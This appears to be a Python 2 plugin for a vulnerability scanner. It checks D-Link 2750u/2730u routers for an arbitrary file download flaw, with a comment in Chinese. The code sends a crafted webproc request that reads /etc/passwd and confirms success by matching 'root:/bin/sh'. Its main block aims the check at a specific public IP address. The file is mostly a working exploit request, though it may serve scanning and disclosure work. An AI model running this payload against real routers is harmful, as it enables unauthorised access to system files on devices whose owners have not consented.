#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: D-Link 2750u/2730u arbitrarily file download
refer: None
访问 http://foobar/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd
读取任意文件
不只D-Link, 类似的有 Observa Telecom Home Station BHS-RTA 参见http://seclists.org/fulldisclosure/2015/May/129 可惜没找到测试样例
'''

import re
import urlparse


def assign(service, arg):
    if service == 'd-link':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200 and 'root:/bin/sh' in res:
        security_hole( payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('d-link','http://59.177.63.144:8080/')[1])